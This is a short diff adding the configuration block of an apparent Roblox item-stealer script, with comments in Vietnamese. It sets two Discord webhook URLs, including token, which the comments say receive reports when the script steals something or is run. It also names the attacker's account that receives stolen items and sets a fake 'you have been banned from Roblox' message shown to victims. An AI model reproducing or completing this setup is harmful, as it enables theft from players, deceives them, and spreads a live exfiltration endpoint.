@@ -1,0 +1,5 @@
+LogsWebhook = "https://discord.com/api/webhooks/1353995053395083314/JNRGiuECbIzLkRjyQFSIDQv9ndGmKa332XTh24Mfe7eBokuBI-RpEcXXLush3-frQTau"; -- Webhook url mà script sẽ gửi về nếu trộm thành công cái gì đó
+ExecutionWebhook = "https://discord.com/api/webhooks/1353995053395083314/JNRGiuECbIzLkRjyQFSIDQv9ndGmKa332XTh24Mfe7eBokuBI-RpEcXXLush3-frQTau"; -- Webhook url mà script sẽ gửi về nếu có người chạy script
+Username = "U_DGmECI" -- Usernames  của mày ( username mà script sẽ gửi item vào nếu cướp thành công ) 
+PromptText = "bạn đã bị cấm khỏi roblox" -- Tin nhắn cho các tình yêu  chạy nhầm script của mày 
+RandomizedPrompt = false -- Ngẫu nhiên style của tin nhắn 
